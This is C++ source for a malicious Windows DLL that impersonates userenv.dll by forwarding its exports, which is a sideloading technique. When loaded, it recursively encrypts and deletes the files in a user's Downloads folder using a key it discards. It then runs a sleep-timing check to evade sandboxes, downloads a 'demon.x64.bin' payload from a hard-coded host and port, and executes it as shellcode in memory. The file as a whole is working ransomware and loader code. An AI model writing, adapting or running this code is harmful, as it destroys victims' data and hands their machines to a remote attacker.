#pragma comment(linker,"/export:AreThereVisibleLogoffScripts=C:\\Windows\\System32\\userenv.AreThereVisibleLogoffScripts,@106")
#pragma comment(linker,"/export:AreThereVisibleShutdownScripts=C:\\Windows\\System32\\userenv.AreThereVisibleShutdownScripts,@107")
#pragma comment(linker,"/export:CreateAppContainerProfile=C:\\Windows\\System32\\userenv.CreateAppContainerProfile,@108")
#pragma comment(linker,"/export:CreateEnvironmentBlock=C:\\Windows\\System32\\userenv.CreateEnvironmentBlock,@109")
#pragma comment(linker,"/export:CreateProfile=C:\\Windows\\System32\\userenv.CreateProfile,@110")
#pragma comment(linker,"/export:DeleteAppContainerProfile=C:\\Windows\\System32\\userenv.DeleteAppContainerProfile,@111")
#pragma comment(linker,"/export:DeleteProfileA=C:\\Windows\\System32\\userenv.DeleteProfileA,@112")
#pragma comment(linker,"/export:DeleteProfileW=C:\\Windows\\System32\\userenv.DeleteProfileW,@113")
#pragma comment(linker,"/export:DeriveAppContainerSidFromAppContainerName=C:\\Windows\\System32\\userenv.DeriveAppContainerSidFromAppContainerName,@114")
#pragma comment(linker,"/export:DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=C:\\Windows\\System32\\userenv.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName,@115")
#pragma comment(linker,"/export:DestroyEnvironmentBlock=C:\\Windows\\System32\\userenv.DestroyEnvironmentBlock,@116")
#pragma comment(linker,"/export:DllCanUnloadNow=C:\\Windows\\System32\\userenv.DllCanUnloadNow,@117")
#pragma comment(linker,"/export:DllGetClassObject=C:\\Windows\\System32\\userenv.DllGetClassObject,@118")
#pragma comment(linker,"/export:DllRegisterServer=C:\\Windows\\System32\\userenv.DllRegisterServer,@119")
#pragma comment(linker,"/export:DllUnregisterServer=C:\\Windows\\System32\\userenv.DllUnregisterServer,@120")
#pragma comment(linker,"/export:EnterCriticalPolicySection=C:\\Windows\\System32\\userenv.EnterCriticalPolicySection,@121")
#pragma comment(linker,"/export:ExpandEnvironmentStringsForUserA=C:\\Windows\\System32\\userenv.ExpandEnvironmentStringsForUserA,@123")
#pragma comment(linker,"/export:ExpandEnvironmentStringsForUserW=C:\\Windows\\System32\\userenv.ExpandEnvironmentStringsForUserW,@124")
#pragma comment(linker,"/export:ForceSyncFgPolicy=C:\\Windows\\System32\\userenv.ForceSyncFgPolicy,@125")
#pragma comment(linker,"/export:FreeGPOListA=C:\\Windows\\System32\\userenv.FreeGPOListA,@126")
#pragma comment(linker,"/export:FreeGPOListW=C:\\Windows\\System32\\userenv.FreeGPOListW,@127")
#pragma comment(linker,"/export:GenerateGPNotification=C:\\Windows\\System32\\userenv.GenerateGPNotification,@128")
#pragma comment(linker,"/export:GetAllUsersProfileDirectoryA=C:\\Windows\\System32\\userenv.GetAllUsersProfileDirectoryA,@129")
#pragma comment(linker,"/export:GetAllUsersProfileDirectoryW=C:\\Windows\\System32\\userenv.GetAllUsersProfileDirectoryW,@130")
#pragma comment(linker,"/export:GetAppContainerFolderPath=C:\\Windows\\System32\\userenv.GetAppContainerFolderPath,@131")
#pragma comment(linker,"/export:GetAppContainerRegistryLocation=C:\\Windows\\System32\\userenv.GetAppContainerRegistryLocation,@132")
#pragma comment(linker,"/export:GetAppliedGPOListA=C:\\Windows\\System32\\userenv.GetAppliedGPOListA,@133")
#pragma comment(linker,"/export:GetAppliedGPOListW=C:\\Windows\\System32\\userenv.GetAppliedGPOListW,@134")
#pragma comment(linker,"/export:GetDefaultUserProfileDirectoryA=C:\\Windows\\System32\\userenv.GetDefaultUserProfileDirectoryA,@136")
#pragma comment(linker,"/export:GetDefaultUserProfileDirectoryW=C:\\Windows\\System32\\userenv.GetDefaultUserProfileDirectoryW,@138")
#pragma comment(linker,"/export:GetGPOListA=C:\\Windows\\System32\\userenv.GetGPOListA,@140")
#pragma comment(linker,"/export:GetGPOListW=C:\\Windows\\System32\\userenv.GetGPOListW,@141")
#pragma comment(linker,"/export:GetNextFgPolicyRefreshInfo=C:\\Windows\\System32\\userenv.GetNextFgPolicyRefreshInfo,@142")
#pragma comment(linker,"/export:GetPreviousFgPolicyRefreshInfo=C:\\Windows\\System32\\userenv.GetPreviousFgPolicyRefreshInfo,@143")
#pragma comment(linker,"/export:GetProfilesDirectoryA=C:\\Windows\\System32\\userenv.GetProfilesDirectoryA,@145")
#pragma comment(linker,"/export:GetProfilesDirectoryW=C:\\Windows\\System32\\userenv.GetProfilesDirectoryW,@146")
#pragma comment(linker,"/export:GetProfileType=C:\\Windows\\System32\\userenv.GetProfileType,@144")
#pragma comment(linker,"/export:GetUserProfileDirectoryA=C:\\Windows\\System32\\userenv.GetUserProfileDirectoryA,@147")
#pragma comment(linker,"/export:GetUserProfileDirectoryW=C:\\Windows\\System32\\userenv.GetUserProfileDirectoryW,@148")
#pragma comment(linker,"/export:HasPolicyForegroundProcessingCompleted=C:\\Windows\\System32\\userenv.HasPolicyForegroundProcessingCompleted,@149")
#pragma comment(linker,"/export:LeaveCriticalPolicySection=C:\\Windows\\System32\\userenv.LeaveCriticalPolicySection,@150")
#pragma comment(linker,"/export:LoadProfileExtender=C:\\Windows\\System32\\userenv.LoadProfileExtender,@151")
#pragma comment(linker,"/export:LoadUserProfileA=C:\\Windows\\System32\\userenv.LoadUserProfileA,@152")
#pragma comment(linker,"/export:LoadUserProfileW=C:\\Windows\\System32\\userenv.LoadUserProfileW,@153")
#pragma comment(linker,"/export:ProcessGroupPolicyCompleted=C:\\Windows\\System32\\userenv.ProcessGroupPolicyCompleted,@154")
#pragma comment(linker,"/export:ProcessGroupPolicyCompletedEx=C:\\Windows\\System32\\userenv.ProcessGroupPolicyCompletedEx,@155")
#pragma comment(linker,"/export:RefreshPolicy=C:\\Windows\\System32\\userenv.RefreshPolicy,@156")
#pragma comment(linker,"/export:RefreshPolicyEx=C:\\Windows\\System32\\userenv.RefreshPolicyEx,@157")
#pragma comment(linker,"/export:RegisterGPNotification=C:\\Windows\\System32\\userenv.RegisterGPNotification,@158")
#pragma comment(linker,"/export:RsopAccessCheckByType=C:\\Windows\\System32\\userenv.RsopAccessCheckByType,@159")
#pragma comment(linker,"/export:RsopFileAccessCheck=C:\\Windows\\System32\\userenv.RsopFileAccessCheck,@160")
#pragma comment(linker,"/export:RsopLoggingEnabled=C:\\Windows\\System32\\userenv.RsopLoggingEnabled,@105")
#pragma comment(linker,"/export:RsopResetPolicySettingStatus=C:\\Windows\\System32\\userenv.RsopResetPolicySettingStatus,@161")
#pragma comment(linker,"/export:RsopSetPolicySettingStatus=C:\\Windows\\System32\\userenv.RsopSetPolicySettingStatus,@162")
#pragma comment(linker,"/export:UnloadProfileExtender=C:\\Windows\\System32\\userenv.UnloadProfileExtender,@163")
#pragma comment(linker,"/export:UnloadUserProfile=C:\\Windows\\System32\\userenv.UnloadUserProfile,@164")
#pragma comment(linker,"/export:UnregisterGPNotification=C:\\Windows\\System32\\userenv.UnregisterGPNotification,@165")
#pragma comment(linker,"/export:WaitForMachinePolicyForegroundProcessing=C:\\Windows\\System32\\userenv.WaitForMachinePolicyForegroundProcessing,@166")
#pragma comment(linker,"/export:WaitForUserPolicyForegroundProcessing=C:\\Windows\\System32\\userenv.WaitForUserPolicyForegroundProcessing,@167")


#include <windows.h>  
#include <processthreadsapi.h>  
#include <memoryapi.h>  
#include <string>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>
#include <wincrypt.h>
#include <stdexcept>
#include <fstream>

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")

// AES-128 CBC decryption using CryptoAPI
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

#define AES_KEY_LENGTH 128
#define BLOCK_SIZE 16

// Helper function to convert std::string to std::wstring
std::wstring stringToWString(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

// Function to check if running with admin privileges
bool IsElevated() {
    BOOL elevated = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    return elevated != FALSE;
}

// Function to recursively list all files in a directory and its subdirectories
std::vector<std::string> listFilesRecursive(const std::string& directory) {
    std::vector<std::string> files;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW((stringToWString(directory) + L"\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring fileName = findFileData.cFileName;
            std::string fullPath = directory + "\\" + std::string(fileName.begin(), fileName.end());

            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (fileName != L"." && fileName != L"..") {
                    std::vector<std::string> subFiles = listFilesRecursive(fullPath);
                    files.insert(files.end(), subFiles.begin(), subFiles.end());
                }
            } else {
                files.push_back(fullPath);
            }
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }

    return files;
}

// Function to encrypt data using AES-128 CBC in Windows CryptoAPI
bool encryptFileAES(const std::string& filename) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    BYTE keyMaterial[32];
    if (!CryptGenRandom(hProv, sizeof(keyMaterial), keyMaterial)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, keyMaterial, sizeof(keyMaterial), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    BYTE iv[BLOCK_SIZE];
    if (!CryptGenRandom(hProv, BLOCK_SIZE, iv)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    HANDLE hInputFile = CreateFileA(filename.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    std::string encryptedFile = filename + ".notwncry";
    HANDLE hOutputFile = CreateFileA(encryptedFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hInputFile);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD bytesWritten;
    WriteFile(hOutputFile, iv, BLOCK_SIZE, &bytesWritten, NULL);

    const size_t BUFFER_SIZE = 4096;
    std::vector<BYTE> buffer(BUFFER_SIZE);
    bool isLastBlock = false;

    while (!isLastBlock) {
        DWORD bytesRead;
        if (!ReadFile(hInputFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL)) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }

        if (bytesRead < BUFFER_SIZE) {
            isLastBlock = true;
            size_t padding = BLOCK_SIZE - (bytesRead % BLOCK_SIZE);
            for (size_t i = bytesRead; i < bytesRead + padding; i++) {
                buffer[i] = static_cast<BYTE>(padding);
            }
            bytesRead += padding;
        }

        DWORD dataSize = bytesRead;
        if (!CryptEncrypt(hKey, 0, isLastBlock, 0, buffer.data(), &dataSize, buffer.size())) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }

        if (!WriteFile(hOutputFile, buffer.data(), dataSize, &bytesWritten, NULL)) {
            CloseHandle(hInputFile);
            CloseHandle(hOutputFile);
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return false;
        }
    }

    CloseHandle(hInputFile);
    CloseHandle(hOutputFile);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    DeleteFileA(filename.c_str());
    return true;
}

void BypassDynamicAnalysis()
{
    int tick = GetTickCount64();
    Sleep(5000);
    int tock = GetTickCount64();
    if ((tock - tick) < 4500)
        exit(0);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, int port, LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    WinHttpReceiveResponse(
        hRequest,
        NULL);

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
    return wString;
}

void RunPayload()
{
    // First run the encryption
    
        std::string targetDir = "C:\\Users\\Harry\\Downloads";
        std::vector<std::string> files = listFilesRecursive(targetDir);
        
        for (const auto& file : files) {
            try {
                encryptFileAES(file);
            } catch (...) {
                continue;
            }
        }
    

    // Then download and execute shellcode
    BypassDynamicAnalysis();
    std::vector<BYTE> recvbuf;
    recvbuf = Download(L"192.168.253.136\0", std::stoi("13337"), L"/demon.x64.bin\0");

    LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!alloc_mem) {
        return;
    }

    CopyMemory(alloc_mem, recvbuf.data(), recvbuf.size());

    DWORD oldProtect;
    if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
        return;
    }

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        return;
    }

    WaitForSingleObject(tHandle, INFINITE);
    ((void(*)())alloc_mem)();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPayload, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
